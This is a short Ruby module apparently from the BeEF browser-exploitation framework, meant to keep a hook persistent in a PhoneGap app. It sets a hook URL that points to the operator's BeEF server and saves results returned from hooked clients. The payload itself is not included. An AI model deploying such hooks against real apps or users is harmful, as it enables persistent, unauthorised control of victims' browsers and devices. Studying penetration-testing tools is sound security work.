# phonegap persistenece
#

class Persistence < BeEF::Core::Command

  def self.options
    @configuration = BeEF::Core::Configuration.instance
    beef_host = @configuration.get("beef.http.public") || @configuration.get("beef.http.host")

    return [{
      'name' => 'hook_url',
      'description' => 'The URL of your BeEF hook',
      'ui_label'=>'Hook URL',
      'value' => 'http://'+beef_host+':3000/hook.js',
      'width' => '300px'
    }]
  end

  def post_execute
    content = {}
    content['result'] = @datastore['result']
    save content
  end 
  
end
